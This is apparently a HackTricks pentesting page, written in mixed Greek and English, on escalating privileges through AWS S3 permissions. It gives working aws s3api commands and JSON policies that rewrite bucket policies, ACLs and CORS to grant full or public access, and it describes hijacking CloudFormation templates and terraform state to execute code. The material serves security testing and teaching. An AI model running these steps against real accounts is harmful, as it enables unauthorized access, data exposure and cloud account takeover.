# AWS - S3 Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## S3

### `s3:PutBucketNotification`, `s3:PutObject`, `s3:GetObject`

Ένας attacker με αυτά τα permissions πάνω σε ενδιαφέροντα buckets μπορεί να μπορέσει να hijack resources και να escalate privileges.

Για παράδειγμα, ένας attacker με αυτά τα **permissions over a cloudformation bucket** called "cf-templates-nohnwfax6a6i-us-east-1" θα μπορεί να hijack το deployment. Η access μπορεί να δοθεί με την ακόλουθη policy:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"s3:PutBucketNotification",
"s3:GetBucketNotification",
"s3:PutObject",
"s3:GetObject"
],
"Resource": [
"arn:aws:s3:::cf-templates-*/*",
"arn:aws:s3:::cf-templates-*"
]
},
{
"Effect": "Allow",
"Action": "s3:ListAllMyBuckets",
"Resource": "*"
}
]
}
```
Και το hijack είναι δυνατό επειδή υπάρχει ένα **μικρό χρονικό παράθυρο από τη στιγμή που το template ανεβαίνει** στο bucket μέχρι τη στιγμή που το **template αναπτύσσεται**. Ένας attacker μπορεί απλά να δημιουργήσει μια **lambda function** στο account του που θα **trigger όταν σταλεί ένα bucket notification**, και να hijacks το **content** αυτού του **bucket**.

![](<../../../images/image (174).png>)

Το Pacu module [`cfn__resouce_injection`](https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details#cfn__resource_injection) μπορεί να χρησιμοποιηθεί για την αυτοματοποίηση αυτής της επίθεσης.\
Για περισσότερες πληροφορίες δείτε την αρχική έρευνα: [https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/](https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/)

### `s3:PutObject`, `s3:GetObject` <a href="#s3putobject-s3getobject" id="s3putobject-s3getobject"></a>

These are the permissions to **get and upload objects to S3**. Several services inside AWS (and outside of it) use S3 storage to store **config files**.\
Ένας attacker με **read access** σε αυτά μπορεί να ανακαλύψει **sensitive information** μέσα σε αυτά.\
Ένας attacker με **write access** σε αυτά θα μπορούσε να **modify the data to abuse some service and try to escalate privileges**.\
Αυτά είναι μερικά παραδείγματα:

- If an EC2 instance is storing the **user data in a S3 bucket**, an attacker could modify it to **execute arbitrary code inside the EC2 instance**.

### `s3:PutObject`, `s3:GetObject` (optional) over terraform state file

It is very common that the [terraform](https://cloud.hacktricks.wiki/en/pentesting-ci-cd/terraform-security.html) state files are being saved to blob storage of cloud providers, e.g. AWS S3. The file suffix for a state file is `.tfstate`, and the bucket names often also give away that they contain terraform state files. Usually, every AWS account has one such bucket to store the state files that show the state of the account. Also usually, in real world accounts almost always all developers have `s3:*` and sometimes even business users have `s3:Put*`.

So, if you have the permissions listed over these files, there is an attack vector that allows you to gain RCE in the pipeline with the privileges of `terraform` - most of the time `AdministratorAccess`, making you the admin of the cloud account. Also, you can use that vector to do a denial of service attack by making `terraform` delete legitimate resources.

Follow the description in the *Abusing Terraform State Files* section of the *Terraform Security* page for directly usable exploit code:

{{#ref}}
../../../../pentesting-ci-cd/terraform-security.md#abusing-terraform-state-files
{{#endref}}

### `s3:PutBucketPolicy`

Ένας attacker, που πρέπει να είναι **from the same account** — αλλιώς θα προκληθεί το σφάλμα `The specified method is not allowed` — με αυτή την permission θα μπορεί να παραχωρήσει στον εαυτό του περισσότερα permissions πάνω στα bucket(s), επιτρέποντάς του να διαβάζει, γράφει, τροποποιεί, διαγράφει και να εκθέτει buckets.
```bash
# Update Bucket policy
aws s3api put-bucket-policy --policy file:///root/policy.json --bucket <bucket-name>

## JSON giving permissions to a user and mantaining some previous root access
{
"Id": "Policy1568185116930",
"Version":"2012-10-17",
"Statement":[
{
"Effect":"Allow",
"Principal":{
"AWS":"arn:aws:iam::123123123123:root"
},
"Action":"s3:ListBucket",
"Resource":"arn:aws:s3:::somebucketname"
},
{
"Effect":"Allow",
"Principal":{
"AWS":"arn:aws:iam::123123123123:user/username"
},
"Action":"s3:*",
"Resource":"arn:aws:s3:::somebucketname/*"
}
]
}

## JSON Public policy example
### IF THE S3 BUCKET IS PROTECTED FROM BEING PUBLICLY EXPOSED, THIS WILL THROW AN ACCESS DENIED EVEN IF YOU HAVE ENOUGH PERMISSIONS
{
"Id": "Policy1568185116930",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Stmt1568184932403",
"Action": [
"s3:ListBucket"
],
"Effect": "Allow",
"Resource": "arn:aws:s3:::welcome",
"Principal": "*"
},
{
"Sid": "Stmt1568185007451",
"Action": [
"s3:GetObject"
],
"Effect": "Allow",
"Resource": "arn:aws:s3:::welcome/*",
"Principal": "*"
}
]
}
```
### `s3:GetBucketAcl`, `s3:PutBucketAcl`

Ένας attacker θα μπορούσε να καταχραστεί αυτά τα δικαιώματα για να **του παραχωρήσει περισσότερη πρόσβαση** σε συγκεκριμένα buckets.\
Σημειώστε ότι ο attacker δεν χρειάζεται να προέρχεται από τον ίδιο λογαριασμό. Επιπλέον, το write access
```bash
# Update bucket ACL
aws s3api get-bucket-acl --bucket <bucket-name>
aws s3api put-bucket-acl --bucket <bucket-name> --access-control-policy file://acl.json

##JSON ACL example
## Make sure to modify the Owner’s displayName and ID according to the Object ACL you retrieved.
{
"Owner": {
"DisplayName": "<DisplayName>",
"ID": "<ID>"
},
"Grants": [
{
"Grantee": {
"Type": "Group",
"URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
},
"Permission": "FULL_CONTROL"
}
]
}
## An ACL should give you the permission WRITE_ACP to be able to put a new ACL
```
### `s3:GetObjectAcl`, `s3:PutObjectAcl`

Ένας attacker θα μπορούσε να καταχραστεί αυτά τα δικαιώματα ώστε να αποκτήσει περισσότερη πρόσβαση σε συγκεκριμένα objects μέσα σε buckets.
```bash
# Update bucket object ACL
aws s3api get-object-acl --bucket <bucekt-name> --key flag
aws s3api put-object-acl --bucket <bucket-name> --key flag --access-control-policy file://objacl.json

##JSON ACL example
## Make sure to modify the Owner’s displayName and ID according to the Object ACL you retrieved.
{
"Owner": {
"DisplayName": "<DisplayName>",
"ID": "<ID>"
},
"Grants": [
{
"Grantee": {
"Type": "Group",
"URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
},
"Permission": "FULL_CONTROL"
}
]
}
## An ACL should give you the permission WRITE_ACP to be able to put a new ACL
```
### `s3:GetObjectAcl`, `s3:PutObjectVersionAcl`

Ένας attacker με αυτά τα privileges αναμένεται να μπορεί να προσαρτήσει ένα Acl σε μία συγκεκριμένη έκδοση αντικειμένου
```bash
aws s3api get-object-acl --bucket <bucekt-name> --key flag
aws s3api put-object-acl --bucket <bucket-name> --key flag --version-id <value> --access-control-policy file://objacl.json
```
### `s3:PutBucketCORS`

Ένας επιτιθέμενος με την άδεια s3:PutBucketCORS μπορεί να τροποποιήσει τη ρύθμιση CORS (Cross-Origin Resource Sharing) ενός bucket, η οποία ελέγχει ποιες web domains μπορούν να προσπελάσουν τα endpoints του. Εάν ορίσει μια επιτρεπτική πολιτική, οποιοσδήποτε ιστότοπος θα μπορούσε να στέλνει άμεσες αιτήσεις στο bucket και να διαβάζει τις αποκρίσεις μέσω browser.

Αυτό σημαίνει ότι, ενδεχομένως, αν ένας αυθεντικοποιημένος χρήστης μιας web εφαρμογής που φιλοξενείται στο bucket επισκεφθεί τον ιστότοπο του επιτιθέμενου, ο επιτιθέμενος θα μπορούσε να εκμεταλλευτεί την επιτρεπτική πολιτική CORS και, ανάλογα με την εφαρμογή, να αποκτήσει πρόσβαση στα δεδομένα προφίλ του χρήστη ή ακόμη και να υποκλέψει τον λογαριασμό του χρήστη.
```bash
aws s3api put-bucket-cors \
--bucket <BUCKET_NAME> \
--cors-configuration '{
"CORSRules": [
{
"AllowedOrigins": ["*"],
"AllowedMethods": ["GET", "PUT", "POST"],
"AllowedHeaders": ["*"],
"ExposeHeaders": ["x-amz-request-id"],
"MaxAgeSeconds": 3000
}
]
}'
```
{{#include ../../../../banners/hacktricks-training.md}}
